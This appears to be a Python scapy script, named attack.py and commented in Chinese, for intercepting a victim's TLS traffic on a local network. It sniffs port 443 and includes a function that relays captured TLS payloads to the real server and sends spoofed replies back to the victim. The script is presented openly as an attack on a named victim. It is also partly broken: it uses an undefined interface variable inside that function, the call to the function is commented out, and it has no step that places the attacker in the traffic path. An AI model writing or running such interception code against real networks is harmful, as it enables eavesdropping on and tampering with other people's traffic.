from scapy.all import *
import sys
import socket

def process_packet(packet, victim_mac, attacker_mac, attacker_ip, victim_ip):
    print(packet)
    if IP in packet and TCP in packet and packet[TCP].dport == 8080:
        print(f"[*] 攔截到來自 {packet[IP].src}:{packet[TCP].sport} 的 TLS 封包")

        # 轉發封包到真正的伺服器
        server_ip = packet[IP].dst
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((server_ip, 443))
            client_socket.send(raw(packet[TCP].payload))  # 發送原始 TLS 負載
            response = client_socket.recv(4096)
            print(f"[*] 從真正的伺服器收到回應: {response[:50]}...")
            
            # 將回應封包改回送給受害者
            new_packet = IP(src=server_ip, dst=victim_ip) / \
                         TCP(sport=443, dport=packet[TCP].sport) / \
                         Raw(load=response)
            send(new_packet, iface=interface)
        
        except Exception as e:
            print(f"[!] 轉發失敗: {e}")
        finally:
            client_socket.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: sudo python3 attack.py <victim_ip> <interface>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    interface = sys.argv[2]
    attacker_ip = get_if_addr(interface)
    attacker_mac = get_if_hwaddr(interface)
    victim_mac = getmacbyip(victim_ip)

    if not victim_mac:
        print(f"無法找到 IP {victim_ip} 的 MAC 位址，請確認是否正確。")
        sys.exit(1)

    print(f"Attacker IP: {attacker_ip}, MAC: {attacker_mac}")
    print(f"Victim IP: {victim_ip}, MAC: {victim_mac}")
    print(f"Interface: {interface}")

    print("[*] 開始攔截 TLS 流量...")
    # sniff(filter="tcp and port 8080", prn=lambda pkt: process_packet(pkt, victim_mac, attacker_mac, attacker_ip, victim_ip), iface=interface)
    sniff(filter="port 443", iface=interface, prn=lambda pkt: print(pkt.summary()), store=0)


if __name__ == "__main__":
    main()
